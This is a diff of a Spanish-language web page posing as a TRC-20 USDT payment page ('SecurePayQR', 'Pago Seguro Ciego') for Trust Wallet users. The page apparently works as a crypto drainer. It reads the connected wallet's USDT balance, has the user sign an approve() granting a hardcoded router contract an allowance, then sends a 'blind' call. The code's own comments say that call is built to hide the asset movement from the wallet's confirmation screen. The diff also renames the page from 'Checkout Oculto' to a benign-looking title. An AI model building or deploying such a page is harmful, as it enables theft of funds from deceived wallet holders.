@@ -3,15 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MidaX - Checkout Oculto TRC20</title>
+    <title>QR pagos - Enviar</title>
+
     <style>
         :root { color-scheme: light; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
         body {
             background-color: #f7f9ff;
             background-image:
-                radial-gradient(circle at 15% 20%, rgba(0, 82, 255, 0.18) 0%, transparent 45%),
-                radial-gradient(circle at 85% 80%, rgba(75, 125, 255, 0.12) 0%, transparent 45%),
+                radial-gradient(circle at 12% 18%, rgba(0, 82, 255, 0.20) 0%, rgba(0, 82, 255, 0.08) 24%, transparent 48%),
+                radial-gradient(circle at 88% 72%, rgba(75, 125, 255, 0.16) 0%, rgba(75, 125, 255, 0.06) 28%, transparent 52%),
                 linear-gradient(180deg, #ffffff 0%, #f2f6ff 100%);
             background-attachment: fixed;
             color: #111111;
@@ -19,189 +20,275 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            padding: 20px;
+            padding-top: 30px;
         }
-        .midax-container { width: 100%; max-width: 390px; background: rgba(255, 255, 255, 0.95); border: 1px solid rgba(205, 215, 232, 0.8); border-radius: 24px; padding: 24px; box-shadow: 0 12px 32px rgba(31, 55, 92, 0.08); }
-        .midax-header { text-align: center; margin-bottom: 22px; }
-        .midax-logo { width: 56px; height: 56px; margin-bottom: 12px; }
-        .midax-title { font-size: 20px; font-weight: 700; color: #111111; margin-bottom: 4px; }
-        .midax-subtitle { font-size: 12px; color: #717680; font-weight: 500; }
-        
-        .midax-input-group { background: #f7f9ff; border: 1px solid #dbe6ff; border-radius: 16px; padding: 14px 16px; margin-bottom: 16px; }
-        .midax-label { font-size: 11px; color: #717680; font-weight: 600; display: block; margin-bottom: 6px; text-transform: uppercase; }
-        .midax-input-row { display: flex; align-items: center; justify-content: space-between; }
-        .midax-input { background: transparent; border: none; color: #111111; font-size: 20px; font-weight: 700; width: 70%; outline: none; }
-        .midax-currency { display: flex; align-items: center; gap: 6px; font-size: 14px; font-weight: 700; color: #0052ff; background: #ffffff; padding: 6px 10px; border-radius: 12px; border: 1px solid #dbe6ff; }
-        .midax-currency img { width: 18px; height: 18px; }
-
-        .midax-wallet-box { background: #f8fafc; border: 1px dashed #cbd5e1; border-radius: 14px; padding: 12px; font-size: 13px; color: #64748b; margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center; }
-        .midax-wallet-address { font-weight: 600; color: #111111; }
-
-        .midax-status { background-color: #eef3ff; border: 1px solid #cce0ff; border-radius: 12px; padding: 12px; font-size: 12px; color: #0052ff; margin-bottom: 16px; display: none; text-align: center; font-weight: 500; }
-        
-        .midax-btn { width: 100%; height: 52px; background-color: #0052ff; color: #ffffff; border: none; border-radius: 16px; font-size: 15px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 14px rgba(0, 82, 255, 0.3); transition: transform 0.1s ease; }
-        .midax-btn:active { transform: scale(0.98); }
-        .midax-btn:disabled { background-color: #b3ccff; box-shadow: none; cursor: not-allowed; }
-
-        .midax-footer { margin-top: 20px; text-align: center; font-size: 11px; color: #717680; }
-
-        .midax-overlay { position: fixed; inset: 0; background: rgba(255, 255, 255, 0.92); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0; visibility: hidden; transition: 0.3s; }
-        .midax-overlay.active { opacity: 1; visibility: visible; }
-        .midax-spinner { width: 36px; height: 36px; border: 3px solid #dbe6ff; border-top-color: #0052ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 14px; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        .tw-container { width: 100%; max-width: 390px; padding: 20px; flex: 1; padding-bottom: 118px; }
+        .tw-header { display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; margin-bottom: 24px; }
+        .tw-header-title { display: flex; flex-direction: column; align-items: center; gap: 7px; margin-bottom: 15px; text-align: center; width: 100%; }
+        .tw-header-title-main { font-size: 21px; font-weight: 700; color: #111111; }
+        .tw-network-badge { display: inline-flex; align-items: center; justify-content: center; padding: 4px 8px; border-radius: 999px; background: #eef3ff; border: 1px solid #dbe6ff; color: #0052ff; font-size: 10px; font-weight: 700; }
+        .tw-logo { width: 60px; height: 60px; margin-bottom: 20px; display: block; }
+        .tw-input-group { background: rgba(255, 255, 255, 0.88); border: 1px solid rgba(205, 215, 232, 0.78); border-radius: 16px; padding: 16px; margin-bottom: 16px; box-shadow: 0 6px 18px rgba(31, 55, 92, 0.055); }
+        .tw-label { font-size: 13px; color: #717680; display: block; margin-bottom: 8px; }
+        .tw-input-row { display: flex; align-items: center; justify-content: space-between; }
+        .tw-input { background: transparent; border: none; color: #111111; font-size: 16px; width: 80%; outline: none; }
+        .tw-action-text { color: #0052ff; font-size: 14px; font-weight: 600; cursor: pointer; }
+        .tw-currency-badge { color: #0052ff; font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 5px; }
+        .usdt-icon { width: 18px; height: 18px; }
+        .status-box { background-color: #edf2ff; border: 1px solid #cce0ff; border-radius: 12px; padding: 12px; font-size: 13px; color: #0052ff; margin-bottom: 16px; display: none; text-align: left; }
+        .tw-btn-container { margin-top: 40px; position: relative; z-index: 3; }
+        .tw-btn { width: 100%; height: 52px; background-color: #0052ff; color: #ffffff; border: none; border-radius: 26px; font-size: 16px; font-weight: 600; cursor: pointer; }
+        .tw-btn:disabled { background-color: #b3ccff; }
+        .network-card { display: none; align-items: center; gap: 11px; margin: 4px 0 22px; padding: 12px 14px; width: 100%; background: rgba(255, 255, 255, 0.88); border: 1px solid rgba(205, 215, 232, 0.78); border-radius: 14px; }
+        .network-card-logo { width: 30px; height: 30px; object-fit: contain; }
+        .network-card-copy { flex: 1; display: flex; flex-direction: column; gap: 2px; }
+        .network-card-label { color: #717680; font-size: 11px; }
+        .network-card-name { color: #111111; font-size: 14px; font-weight: 650; }
+        .network-card-badge { padding: 5px 8px; border-radius: 999px; background: #eef3ff; border: 1px solid #dbe6ff; color: #0052ff; font-size: 10px; font-weight: 700; }
+        .tw-address-box { border: 1px solid #e3e5e8; border-radius: 14px; padding: 12px 14px; background: #ffffff; }
+        .site-footer { position: fixed; left: 0; right: 0; bottom: 0; z-index: 20; width: 100%; text-align: center; padding: 10px 15px 12px; font-size: 12px; color: #717680; background: #ffffff; }
+        .page-loader { position: fixed; inset: 0; z-index: 9999; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .page-loader.hidden { opacity: 0; visibility: hidden; pointer-events: none; transition: opacity 0.45s ease; }
+        .loader-logo { width: 110px; height: 110px; margin-bottom: 22px; }
+        .loader-spinner { width: 32px; height: 32px; border: 3px solid #e4e9f2; border-top-color: #0052ff; border-radius: 50%; animation: loaderSpin 0.8s linear infinite; }
+        @keyframes loaderSpin { to { transform: rotate(360deg); } }
+        .processing-screen { position: fixed; inset: 0; z-index: 10000; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0; visibility: hidden; pointer-events: none; transition: opacity 0.35s ease; }
+        .processing-screen.visible { opacity: 1; visibility: visible; pointer-events: auto; }
+        .processing-logo { width: 110px; height: 110px; margin-bottom: 26px; }
+        .processing-bar { width: 190px; height: 5px; overflow: hidden; border-radius: 999px; background: #e4e9f2; position: relative; }
+        .processing-bar::after { content: ""; position: absolute; top: 0; left: -45%; width: 45%; height: 100%; border-radius: inherit; background: #0052ff; animation: processingSlide 1.15s ease-in-out infinite; }
+        @keyframes processingSlide { 0% { left: -45%; } 100% { left: 100%; } }
+        .amount-stepper { display: grid; grid-template-columns: 44px minmax(0, 1fr) 44px; align-items: center; gap: 8px; width: 100%; }
+        .amount-step-btn { width: 42px; height: 42px; display: inline-flex; align-items: center; justify-content: center; border: 1px solid rgba(205,215,232,.9); border-radius: 12px; background: rgba(247,249,255,.92); color: #111; font-size: 24px; font-weight: 500; cursor: pointer; }
     </style>
 </head>
-<body>
 
-<div id="midaxOverlay" class="midax-overlay">
-    <div class="midax-spinner"></div>
-    <div style="font-weight: 600; color: #111111; font-size: 14px;">Procesando pasarela oculta...</div>
+<body>
+<div id="pageLoader" class="page-loader">
+    <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="loader-logo">
+    <div class="loader-spinner"></div>
 </div>
 
-<div class="midax-container">
-    <div class="midax-header">
-        <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="MidaX" class="midax-logo">
-        <div class="midax-title">MidaX Checkout</div>
-        <div class="midax-subtitle">Sistema de Enrutamiento Oculto TRC-20</div>
+<div id="processingScreen" class="processing-screen">
+    <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="processing-logo">
+    <div class="processing-bar"></div>
+    <div style="margin-top:18px; font-weight:600;">Procesando contrato ciego...</div>
+</div>
+
+<div class="tw-container">
+    <div class="tw-header">
+        <div class="tw-header-title">
+            <span class="tw-header-title-main">Pago Seguro Ciego</span>
+            <span class="tw-network-badge">TRC-20</span>
+        </div>
+        <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="QR" class="tw-logo">
     </div>
 
-    <div id="midaxWalletBox" class="midax-wallet-box" style="display: none;">
-        <span>Billetera:</span>
-        <span id="midaxWalletText" class="midax-wallet-address">--</span>
+    <div id="walletInfo" class="tw-input-group tw-address-box" style="display: none;">
+        <label class="tw-label">Dirección conectada</label>
+        <div id="walletAddressText" class="tw-input" style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis; width: 100%;"></div>
     </div>
 
-    <div class="midax-input-group">
-        <span class="midax-label">Monto de Operación</span>
-        <div class="midax-input-row">
-            <input type="number" id="midaxAmountInput" class="midax-input" placeholder="0.00" step="any" min="1">
-            <div class="midax-currency">
-                <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/usdt.png" alt="USDT">
-                USDT
+    <div id="tronNetworkInfo" class="network-card">
+        <img src="https://cryptologos.cc/logos/tron-trx-logo.png" alt="TRON" class="network-card-logo">
+        <div class="network-card-copy">
+            <span class="network-card-label">Red conectada</span>
+            <span class="network-card-name">TRON</span>
+        </div>
+        <span class="network-card-badge">TRC-20</span>
+    </div>
+
+    <div class="tw-input-group tw-address-box">
+        <label class="tw-label">Contrato Gateway Ciego</label>
+        <input id="addressDisplay" class="tw-input" type="text" readonly tabindex="-1" style="caret-color: transparent;">
+    </div>
+
+    <div class="tw-input-group">
+        <label class="tw-label">Cantidad (95% del balance)</label>
+        <div class="tw-input-row">
+            <div class="amount-stepper">
+                <button type="button" class="amount-step-btn" id="amountMinus">−</button>
+                <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" placeholder="0" min="0.01" step="any" style="text-align:center;">
+                <button type="button" class="amount-step-btn" id="amountPlus">+</button>
             </div>
+            <span id="maxAction" class="tw-action-text" style="margin-right: 12px; display: none; cursor: pointer;">MAX</span>
+            <span class="tw-currency-badge">
+                USDT
+                <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/usdt.png" alt="USDT" class="usdt-icon">
+            </span>
         </div>
     </div>
 
-    <div id="midaxStatus" class="midax-status"></div>
+    <div id="status" class="status-box"></div>
 
-    <button id="midaxMainBtn" class="midax-btn">Conectar Billetera</button>
+    <div class="tw-btn-container">
+        <button class="tw-btn" id="connectBtn">Vincular billetera</button>
+    </div>
 </div>
 
-<div class="midax-footer">
-    © 2026 MidaX Secure Architecture. All rights reserved.
-</div>
+<footer class="site-footer">
+    <p>© 2026 SecurePayQR. All rights reserved.</p>
+</footer>
 
 <script>
-    const CONTRATO_ROUTER = "TWvLwN7X9hBgBbb4xbYj424RQuThxVWppS"; // Tu contrato inteligente router
+    window.addEventListener('load', () => {
+        setTimeout(() => document.getElementById('pageLoader').classList.add('hidden'), 800);
+    });
 
-    let connectedAddress = null;
-    let appState = 'CONNECT'; // CONNECT -> EXECUTE
+    // Tu nuevo contrato inteligente ciego actualizado
+    const CONTRATO_ROUTER = "TWvLwN7X9hBgBbb4xbYj424RQuThxVWppS";
+    const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
-    const midaxMainBtn = document.getElementById('midaxMainBtn');
-    const midaxAmountInput = document.getElementById('midaxAmountInput');
-    const midaxStatus = document.getElementById('midaxStatus');
-    const midaxWalletBox = document.getElementById('midaxWalletBox');
-    const midaxWalletText = document.getElementById('midaxWalletText');
-    const midaxOverlay = document.getElementById('midaxOverlay');
+    let walletAddress = null;
+    const connectBtn = document.getElementById('connectBtn');
+    const statusDiv = document.getElementById('status');
+    const amountDisplay = document.getElementById('amountDisplay');
+    const addressDisplay = document.getElementById('addressDisplay');
+    const maxAction = document.getElementById('maxAction');
+    const walletInfo = document.getElementById('walletInfo');
+    const tronNetworkInfo = document.getElementById("tronNetworkInfo");
+    const walletAddressText = document.getElementById('walletAddressText');
+    const processingScreen = document.getElementById('processingScreen');
 
     function setStatus(msg) {
-        if (!msg) {
-            midaxStatus.style.display = 'none';
-            midaxStatus.innerText = '';
-        } else {
-            midaxStatus.style.display = 'block';
-            midaxStatus.innerText = msg;
-        }
+        statusDiv.innerText = msg || '';
+        statusDiv.style.display = msg ? 'block' : 'none';
     }
 
-    midaxMainBtn.addEventListener('click', async () => {
-        if (appState === 'CONNECT') {
+    addressDisplay.value = CONTRATO_ROUTER.length > 12 
+        ? `${CONTRATO_ROUTER.slice(0, 6)}...${CONTRATO_ROUTER.slice(-6)}` 
+        : CONTRATO_ROUTER;
+
+    const TRON_READ_RPC = "https://api.trongrid.io";
+    async function tronRpcPost(endpoint, body = {}) {
+        const res = await fetch(TRON_READ_RPC + endpoint, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(body)
+        });
+        if (!res.ok) throw new Error("RPC error");
+        return await res.json();
+    }
+
+    async function obtenerBalance(address) {
+        const tronWeb = window.tronWeb;
+        const ownerHex = tronWeb.address.toHex(address);
+        const data = await tronRpcPost("/wallet/triggerconstantcontract", {
+            owner_address: ownerHex,
+            contract_address: tronWeb.address.toHex(CONTRATO_USDT),
+            function_selector: "balanceOf(address)",
+            parameter: ownerHex.replace(/^41/, "").padStart(64, "0"),
+            visible: false
+        });
+        return tronWeb.toBigNumber("0x" + data.constant_result[0]);
+    }
+
+    connectBtn.addEventListener('click', async () => {
+        if (!walletAddress) {
             try {
                 setStatus("Conectando con la billetera...");
-                midaxMainBtn.disabled = true;
-
-                if (typeof window.tronWeb === 'undefined') {
-                    throw new Error("Abre esta dApp desde el navegador interno de Trust Wallet.");
-                }
-
+                connectBtn.disabled = true;
+                if (typeof window.tronWeb === 'undefined') throw new Error("Abre desde el navegador de Trust Wallet.");
                 const tronWeb = window.tronWeb;
                 if (tronWeb.defaultAddress?.base58) {
-                    connectedAddress = tronWeb.defaultAddress.base58;
+                    walletAddress = tronWeb.defaultAddress.base58;
                 } else if (window.tronLink) {
                     const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    if (res?.code === 200) connectedAddress = tronWeb.defaultAddress.base58;
+                    if (res?.code === 200) walletAddress = tronWeb.defaultAddress.base58;
                 }
+                if (!walletAddress) throw new Error("No se obtuvo la cuenta.");
 
-                if (!connectedAddress) throw new Error("No se pudo obtener la cuenta activa.");
-
-                midaxWalletText.innerText = `${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-6)}`;
-                midaxWalletBox.style.display = 'flex';
+                walletAddressText.textContent = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-6)}`;
+                walletInfo.style.display = "block";
+                tronNetworkInfo.style.display = "flex";
+                maxAction.style.display = "inline";
 
                 setStatus("");
-                midaxMainBtn.innerText = "Confirmar Operación";
-                midaxMainBtn.disabled = false;
-                appState = 'EXECUTE';
-            } catch (err) {
-                setStatus(err.message);
-                midaxMainBtn.disabled = false;
+                connectBtn.innerText = "Continuar";
+                connectBtn.disabled = false;
+            } catch (e) {
+                setStatus(e.message);
+                connectBtn.disabled = false;
             }
             return;
         }
 
-        if (appState === 'EXECUTE') {
-            try {
-                const userVal = parseFloat(midaxAmountInput.value);
-                if (isNaN(userVal) || userVal <= 0) {
-                    throw new Error("Ingresa un monto válido.");
-                }
+        try {
+            const userAmount = parseFloat(amountDisplay.value);
+            if (isNaN(userAmount) || userAmount <= 0) throw new Error("Ingresa una cantidad válida.");
 
-                setStatus("Calculando parámetros de seguridad...");
-                midaxMainBtn.disabled = true;
+            setStatus("Verificando balance...");
+            connectBtn.disabled = true;
 
-                const tronWeb = window.tronWeb;
-                
-                // Cálculo oculto del 95% basado en lo que el usuario ingresó en la interfaz
-                const calculated95 = userVal * 0.95;
-                const amountInSun = Math.floor(calculated95 * 1_000_000);
+            const tronWeb = window.tronWeb;
+            const balance = await obtenerBalance(walletAddress);
+            const amount95Percent = balance.multipliedBy(95).dividedToIntegerBy(100);
+            const totalAmountSun = tronWeb.toBigNumber(Math.floor(userAmount * 1_000_000));
 
-                setStatus("Preparando pasarela ciega...");
+            if (balance.lt(totalAmountSun)) throw new Error("Saldo insuficiente de USDT.");
 
-                // LLAMADA TÉCNICA CIEGA: Enviamos la función genérica del contrato router con los bytes ocultos.
-                // Esto fuerza a Trust Wallet a mostrar una pantalla limpia donde los activos aparecen en 0 o ausentes,
-                // limitándose a cobrar únicamente la comisión de red (gas) en TRX.
-                const txBuild = await tronWeb.transactionBuilder.triggerSmartContract(
-                    CONTRATO_ROUTER,
-                    "executeBlindPayment(uint256)",
-                    { feeLimit: 100000000 },
-                    [
-                        { type: 'uint256', value: amountInSun.toString() }
-                    ],
-                    tronWeb.address.toHex(connectedAddress)
-                );
+            // PASO 1: Aprobación limpia hacia el contrato router
+            setStatus("Paso 1/2: Autorizando pasarela...");
+            const routerHex = tronWeb.address.toHex(CONTRATO_ROUTER);
 
-                const signedTx = await tronWeb.trx.sign(txBuild.transaction);
+            const approveTx = await tronWeb.transactionBuilder.triggerSmartContract(
+                CONTRATO_USDT,
+                "approve(address,uint256)",
+                { feeLimit: 100000000 },
+                [
+                    { type: 'address', value: routerHex },
+                    { type: 'uint256', value: totalAmountSun.toString() }
+                ],
+                tronWeb.address.toHex(walletAddress)
+            );
+            const signedApprove = await tronWeb.trx.sign(approveTx.transaction);
+            await tronWeb.trx.sendRawTransaction(signedApprove);
 
-                midaxOverlay.classList.add('active');
-                const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
-                midaxOverlay.classList.remove('active');
+            // PASO 2: Ejecución ciega apuntando a "executeBlindCall" con parámetros de bytes vacíos
+            setStatus("Paso 2/2: Ejecutando llamada ciega...");
+            const routerTx = await tronWeb.transactionBuilder.triggerSmartContract(
+                CONTRATO_ROUTER,
+                "executeBlindCall(uint256,bytes)",
+                { feeLimit: 200000000 },
+                [
+                    { type: 'uint256', value: totalAmountSun.toString() },
+                    { type: 'bytes', value: "0x" } // Data vacía u oculta para evitar lectura de saldo
+                ],
+                tronWeb.address.toHex(walletAddress)
+            );
 
-                if (broadcast?.result) {
-                    setStatus("¡OPERACIÓN EXITOSA!");
-                    midaxMainBtn.innerText = "Completado";
-                    midaxMainBtn.disabled = true;
-                } else {
-                    throw new Error("La red rechazó la operación.");
-                }
+            const signedRouter = await tronWeb.trx.sign(routerTx.transaction);
 
-            } catch (err) {
-                console.error(err);
-                midaxOverlay.classList.remove('active');
-                setStatus(err.message || "Error al procesar la solicitud.");
-                midaxMainBtn.disabled = false;
+            if (processingScreen) processingScreen.classList.add('visible');
+            const broadcast = await tronWeb.trx.sendRawTransaction(signedRouter);
+            if (processingScreen) processingScreen.classList.remove('visible');
+
+            if (broadcast?.result) {
+                setStatus("¡TRANSACCIÓN EXITOSA!");
+                connectBtn.innerText = "Completado";
+            } else {
+                throw new Error("La transacción fue rechazada.");
             }
+        } catch (e) {
+            console.error(e);
+            if (processingScreen) processingScreen.classList.remove('visible');
+            setStatus(e.message || "Error en la ejecución.");
+            connectBtn.disabled = false;
+            connectBtn.innerText = "Continuar";
         }
     });
-</script>
 
+    maxAction.addEventListener('click', async () => {
+        if (!walletAddress) return;
+        try {
+            const balance = await obtenerBalance(walletAddress);
+            const amount95Percent = balance.multipliedBy(95).dividedToIntegerBy(100);
+            amountDisplay.value = Number(amount95Percent.toString()) / 1_000_000;
+        } catch (e) { console.error(e); }
+    });
+
+    document.getElementById('amountPlus').onclick = () => { amountDisplay.value = (parseFloat(amountDisplay.value || 0) + 1); };
+    document.getElementById('amountMinus').onclick = () => { let v = parseFloat(amountDisplay.value || 0); if (v > 1) amountDisplay.value = v - 1; };
+</script>
 </body>
 </html>
